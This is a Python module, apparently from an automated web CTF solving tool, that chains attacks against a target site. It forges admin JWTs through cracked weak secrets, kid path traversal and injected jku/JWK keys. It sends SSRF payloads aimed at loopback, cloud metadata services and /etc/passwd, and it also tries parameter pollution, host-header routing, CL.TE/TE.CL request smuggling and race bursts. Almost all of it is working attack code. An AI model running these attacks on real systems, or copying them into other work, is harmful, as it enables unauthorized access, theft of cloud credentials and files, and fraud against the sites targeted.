"""Bounded high-signal Web CTF workflows.

This module complements the broad scanner with attacks that need a coherent
request sequence rather than one fuzz string: JWT ``jku``/``kid`` handling,
SSRF URL normalization bypasses, HTTP parameter pollution/cache routing,
request-smuggling canaries, and synchronized race bursts.  It never reports
a vulnerability as a flag unless the target response actually contains a
flag-shaped value.
"""
import base64
import binascii
import hashlib
import hmac
import json
import os
import re
import socket
import ssl
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

from core import httpx
from core.flag import extract_flags
from . import jwt as jwt_mod


_JWT_RE = re.compile(r"(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


def _flags(response):
    if response is None:
        return []
    values = [getattr(response, "text", "")]
    headers = getattr(response, "headers", {}) or {}
    values.extend(str(value) for key, value in headers.items()
                  if "flag" in str(key).lower() or
                  str(key).lower() in {"x-debug", "x-secret", "location"})
    out = []
    for value in values:
        known, candidates = extract_flags(value)
        for item in known + candidates:
            if item not in out:
                out.append(item)
    return out


def _json(response):
    try:
        value = json.loads(response.text or "{}")
        return value if isinstance(value, (dict, list)) else {}
    except (AttributeError, TypeError, ValueError):
        return {}


def _b64url(value):
    if isinstance(value, str):
        value = value.encode()
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


def _jwt_parts(token):
    parts = str(token or "").split(".")
    if len(parts) != 3:
        return None
    try:
        def decode(value):
            return json.loads(base64.urlsafe_b64decode(
                value + "=" * (-len(value) % 4)).decode())
        return parts, decode(parts[0]), decode(parts[1])
    except (ValueError, TypeError, UnicodeDecodeError, binascii.Error,
            json.JSONDecodeError):
        return None


def forge_hs_claims(token, secret, claims=None, headers=None):
    """Forge an HS256 token while preserving non-security claims."""
    parsed = _jwt_parts(token)
    if not parsed:
        return None
    _, old_header, old_payload = parsed
    header = dict(old_header)
    header.update(headers or {})
    header["alg"] = "HS256"
    payload = dict(old_payload) if isinstance(old_payload, dict) else {}
    payload.update(claims or {})
    h = _b64url(json.dumps(header, separators=(",", ":")))
    p = _b64url(json.dumps(payload, separators=(",", ":")))
    sig = hmac.new(str(secret).encode(), (h + "." + p).encode(),
                   hashlib.sha256).digest()
    return h + "." + p + "." + _b64url(sig)


def _rsa_sign_rs256(header, payload, private):
    try:
        from modules.crypto.rsa import bytes_to_long, long_to_bytes
        n, d = int(private["n"]), int(private["d"])
        h = _b64url(json.dumps(header, separators=(",", ":")))
        p = _b64url(json.dumps(payload, separators=(",", ":")))
        data = (h + "." + p).encode()
        digest_info = bytes.fromhex(
            "3031300d060960864801650304020105000420") + hashlib.sha256(data).digest()
        size = (n.bit_length() + 7) // 8
        if size < len(digest_info) + 11:
            return None
        encoded = b"\x00\x01" + b"\xff" * (size - len(digest_info) - 3)
        encoded += b"\x00" + digest_info
        sig = pow(bytes_to_long(encoded), d, n).to_bytes(size, "big")
        return h + "." + p + "." + _b64url(sig)
    except (KeyError, TypeError, ValueError, OverflowError):
        return None


def _candidate_endpoints(base, endpoints, words):
    values = []
    for endpoint in endpoints or ():
        parsed = urllib.parse.urlparse(endpoint)
        path = parsed.path.lower()
        if any(word in path or word in parsed.query.lower() for word in words):
            values.append(endpoint.split("#", 1)[0])
    values.extend(base + path for path in (
        "/api/fetch", "/fetch", "/proxy", "/preview", "/render",
        "/api/redirect", "/redirect", "/api/resolve", "/api/import",
        "/api/claim", "/claim", "/redeem", "/coupon", "/buy",
    ))
    return list(dict.fromkeys(values))


def _protected_gets(base, token, cookie=None):
    headers = {"Authorization": "Bearer " + token}
    if cookie:
        headers["Cookie"] = cookie
    out = []
    for path in ("/admin", "/api/admin", "/api/me", "/flag", "/api/flag"):
        response = httpx.get(base + path, headers=headers, timeout=7)
        out.extend(_flags(response))
    return list(dict.fromkeys(out))


def _cookie_with_token(token, forged):
    cookie = httpx.cookie_header()
    if token and cookie and token in cookie:
        return cookie.replace(token, forged)
    return None


def _collect_jwts(base, endpoints):
    found = []
    cookie = httpx.cookie_header()
    found.extend(_JWT_RE.findall(cookie or ""))
    found.extend(_JWT_RE.findall(httpx.auth_snapshot() or ""))
    urls = list(dict.fromkeys((endpoints or [])[:24] + [base + "/", base + "/api/me",
                                                    base + "/login", base + "/auth"]))
    for endpoint in urls:
        response = httpx.get(endpoint, timeout=6)
        if response is not None:
            found.extend(_JWT_RE.findall(response.text or ""))
            found.extend(_JWT_RE.findall(str(response.headers.get("authorization", ""))))
    return list(dict.fromkeys(found))[:4]


def _new_rsa_key():
    """Generate a short-lived key for jku/JWK callback tests."""
    try:
        from Crypto.PublicKey import RSA
        key = RSA.generate(2048)
        return {"n": int(key.n), "e": int(key.e), "d": int(key.d)}
    except Exception:
        return None


def _public_jwk(private):
    def num(value):
        raw = int(value).to_bytes((int(value).bit_length() + 7) // 8, "big")
        return _b64url(raw)
    return {"kty": "RSA", "n": num(private["n"]), "e": num(private["e"]),
            "alg": "RS256", "use": "sig", "kid": "ctf-auto"}


def scan_jwt_header_attacks(base, endpoints):
    """Exercise discovered JWTs through jku/kid/JWK trust boundaries."""
    findings, flags = [], []
    tokens = _collect_jwts(base, endpoints)
    callback = os.environ.get("CTF_AUTO_JWK_URL", "").strip()
    private = _new_rsa_key() if callback else None
    common_secrets = ("", "secret", "admin")

    for token in tokens:
        parsed = _jwt_parts(token)
        if not parsed:
            continue
        _, header, payload = parsed
        admin_claims = {"role": "admin", "isAdmin": True, "admin": True,
                        "user": "admin", "username": "admin"}
        # If the original HS secret is weak, this is a fully verified claim
        # forgery rather than a speculative header mutation.
        secret = jwt_mod.crack_secret(token, workers=8)
        if secret:
            forged = forge_hs_claims(token, secret, admin_claims)
            if forged:
                got = _protected_gets(base, forged,
                                      _cookie_with_token(token, forged))
                if got:
                    findings.append("  [!] JWT weak-secret claim forgery reached protected route")
                    flags.extend(got)
        # kid path/SQL resolver can select an empty or predictable key.  Try a
        # small, documented set and only accept an actual flag response.
        kid_values = ("../../../../dev/null", "..%2f..%2f..%2fdev%2fnull",
                      "admin", "default")
        for kid in kid_values:
            for secret_candidate in common_secrets:
                forged = forge_hs_claims(
                    token, secret_candidate, admin_claims,
                    headers={"kid": kid})
                if not forged:
                    continue
                got = _protected_gets(base, forged,
                                      _cookie_with_token(token, forged))
                if got:
                    findings.append(f"  [!] JWT kid resolver accepted {kid!r}")
                    flags.extend(got)
                    break
            if flags:
                break

        # A caller can expose a JWK from an HTTPS tunnel/public callback.  Do
        # not claim success merely because the header is reflected; require a
        # flag from a protected route.
        if callback and private:
            jwk = _public_jwk(private)
            attacker_payload = dict(payload) if isinstance(payload, dict) else {}
            attacker_payload.update(admin_claims)
            forged = _rsa_sign_rs256(
                {"alg": "RS256", "typ": "JWT", "jku": callback,
                 "kid": "ctf-auto", "jwk": jwk},
                attacker_payload,
                private)
            if forged:
                got = _protected_gets(base, forged,
                                      _cookie_with_token(token, forged))
                if got:
                    findings.append("  [!] JWT attacker-controlled JWK/JKU trusted")
                    flags.extend(got)
    return findings, list(dict.fromkeys(flags))


def _url_variants(value):
    """Return loopback/metadata spellings used by SSRF filters."""
    values = [
        "http://127.0.0.1/flag", "http://127.1/flag",
        "http://localhost/flag", "http://[::1]/flag",
        "http://2130706433/flag", "http://0x7f000001/flag",
        "http://0177.0.0.1/flag", "http://127.0.0.1.nip.io/flag",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "file:///flag", "file:///etc/passwd",
    ]
    if value:
        values.insert(0, str(value))
    return values


def _replace_query(url, key, value):
    parsed = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not query:
        query = [(key, value)]
    else:
        query = [(name, value if name == key else old)
                 for name, old in query]
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                                    urllib.parse.urlencode(query), parsed.fragment))


def scan_ssrf_bypasses(base, endpoints):
    findings, flags = [], []
    candidates = _candidate_endpoints(base, endpoints,
                                      ("url", "uri", "path", "dest", "fetch",
                                       "proxy", "redirect", "preview", "image",
                                       "callback", "webhook", "import"))
    for endpoint in candidates[:18]:
        parsed = urllib.parse.urlsplit(endpoint)
        keys = [name for name, _ in urllib.parse.parse_qsl(parsed.query,
                                                            keep_blank_values=True)]
        if not keys:
            keys = ["url"]
        baseline = httpx.get(endpoint, timeout=6)
        baseline_len = len(getattr(baseline, "body", b"") or b"")
        for key in keys[:3]:
            for target in _url_variants(None)[:10]:
                response = httpx.get(_replace_query(endpoint, key, target), timeout=7)
                got = _flags(response)
                if got:
                    findings.append(f"  [!] SSRF URL normalization bypass via {key} → {target}")
                    flags.extend(got)
                    break
                # Keep an internal-response hint, but do not turn it into a
                # false flag.  It helps the competitor decide what to replay.
                body = getattr(response, "text", "") if response else ""
                if response is not None and len(body) > baseline_len + 80 and any(
                        marker in body.lower() for marker in ("ami-id", "instance-id",
                                                              "root:x:", "localhost")):
                    findings.append(f"  [!] SSRF candidate {key} → {target} (internal body delta)")
            if flags:
                break
        if flags:
            break
    return findings, list(dict.fromkeys(flags))


def _duplicate_query(url, key, values):
    parsed = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    query = [(name, old) for name, old in query if name != key]
    query.extend((key, value) for value in values)
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                                    urllib.parse.urlencode(query), parsed.fragment))


def scan_parameter_pollution(base, endpoints):
    findings, flags = [], []
    candidates = [endpoint for endpoint in endpoints or () if
                  urllib.parse.urlsplit(endpoint).query]
    candidates.extend(base + path for path in ("/?role=user", "/?id=1",
                                                "/api/me?user=guest"))
    for endpoint in list(dict.fromkeys(candidates))[:20]:
        pairs = urllib.parse.parse_qsl(urllib.parse.urlsplit(endpoint).query,
                                       keep_blank_values=True)
        for key, value in pairs[:4]:
            variants = ((value, "admin"), ("guest", "admin"),
                        (value, "../flag"), (value, "0"))
            response = httpx.get(_duplicate_query(endpoint, key, variants),
                                 timeout=6)
            got = _flags(response)
            if got:
                findings.append(f"  [!] HTTP parameter pollution on {key}")
                flags.extend(got)
                return findings, list(dict.fromkeys(flags))
    return findings, flags


def scan_cache_and_host_routing(base, endpoints):
    findings, flags = [], []
    paths = ["/", "/admin", "/api/me", "/dashboard", "/flag", "/api/flag"]
    for endpoint in endpoints or ():
        path = urllib.parse.urlsplit(endpoint).path
        if path and path != "/":
            paths.append(path)
    for path in list(dict.fromkeys(paths))[:18]:
        target = base + path if path.startswith("/") else path
        for headers in (
            {"X-Forwarded-Host": "attacker.invalid"},
            {"X-Host": "attacker.invalid"},
            {"X-Forwarded-Proto": "http", "X-Forwarded-Host": "localhost"},
            {"X-Original-URL": "/internal/flag"},
            {"X-Rewrite-URL": "/internal/flag"},
        ):
            response = httpx.get(target, headers=headers, timeout=6)
            got = _flags(response)
            if got:
                findings.append(f"  [!] cache/host routing accepted {headers} on {path}")
                flags.extend(got)
                return findings, list(dict.fromkeys(flags))
            location = str(getattr(response, "headers", {}).get("location", ""))
            if "attacker.invalid" in location:
                findings.append(f"  [!] host-header redirect poisoning candidate on {path}")
    return findings, flags


def _raw_http(url, payload, timeout=3):
    parsed = urllib.parse.urlsplit(url)
    host, port = parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
    if not host:
        return b""
    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if parsed.scheme == "https":
            context = ssl._create_unverified_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        sock.sendall(payload)
        chunks = []
        while sum(len(chunk) for chunk in chunks) < 256 * 1024:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)
    except (OSError, ssl.SSLError):
        return b""
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def _smuggle_payload(path, host, mode="clte"):
    second = (f"GET /flag HTTP/1.1\r\nHost: {host}\r\n"
              "Connection: close\r\n\r\n").encode()
    if mode == "tecl":
        body = b"5\r\n0\r\n\r\n" + second
        headers = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"Transfer-Encoding: chunked\r\nContent-Length: {len(body)}\r\n"
                   "Connection: keep-alive\r\n\r\n").encode()
    else:
        body = b"0\r\n\r\n" + second
        headers = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n"
                   "Connection: keep-alive\r\n\r\n").encode()
    return headers + body


def scan_request_smuggling(base, endpoints):
    findings, flags = [], []
    parsed_base = urllib.parse.urlsplit(base)
    host = parsed_base.netloc
    paths = [urllib.parse.urlsplit(endpoint).path or "/"
             for endpoint in endpoints or ()]
    paths.extend(("/", "/login", "/api", "/api/login"))
    for path in list(dict.fromkeys(paths))[:4]:
        for mode in ("clte", "tecl"):
            response = _raw_http(base, _smuggle_payload(path, host, mode))
            text = response.decode("utf-8", "replace")
            known, candidates = extract_flags(text)
            if known or candidates:
                findings.append(f"  [!] HTTP request-smuggling {mode.upper()} exposed /flag")
                flags.extend(known + candidates)
                return findings, list(dict.fromkeys(flags))
    return findings, flags


def scan_race_sync(base, endpoints):
    """Use a barrier and fresh worker connections for single-endpoint races."""
    candidates = _candidate_endpoints(base, endpoints,
                                      ("claim", "redeem", "coupon", "buy",
                                       "transfer", "vote", "earn", "bonus"))
    candidates = [endpoint for endpoint in candidates if
                  any(word in urllib.parse.urlsplit(endpoint).path.lower()
                      for word in ("claim", "redeem", "coupon", "buy", "transfer",
                                   "vote", "earn", "bonus"))][:8]
    findings, flags = [], []
    for endpoint in candidates:
        barrier = threading.Barrier(16)

        def one(index):
            try:
                barrier.wait(timeout=4)
            except threading.BrokenBarrierError:
                return None
            return httpx.post(endpoint, data={"amount": "1", "code": "FREE",
                                              "request_id": f"ctf-auto-{index}"},
                              timeout=8)

        with ThreadPoolExecutor(max_workers=16) as pool:
            responses = list(pool.map(one, range(16)))
        for response in responses:
            flags.extend(_flags(response))
        for path in ("/flag", "/api/flag", "/profile", "/api/me", "/balance"):
            flags.extend(_flags(httpx.get(base + path, timeout=7)))
        if flags:
            findings.append(f"  [!] synchronized race burst on {endpoint}")
            break
    return findings, list(dict.fromkeys(flags))


def scan_hard_web(base, endpoints):
    jobs = (
        scan_jwt_header_attacks,
        scan_ssrf_bypasses,
        scan_parameter_pollution,
        scan_cache_and_host_routing,
        scan_request_smuggling,
        scan_race_sync,
    )
    findings, flags = [], []
    with ThreadPoolExecutor(max_workers=len(jobs)) as pool:
        futures = [pool.submit(job, base, endpoints) for job in jobs]
        for future in futures:
            try:
                f, fl = future.result()
            except Exception:
                continue
            findings.extend(f)
            flags.extend(fl)
    return findings, list(dict.fromkeys(flags))
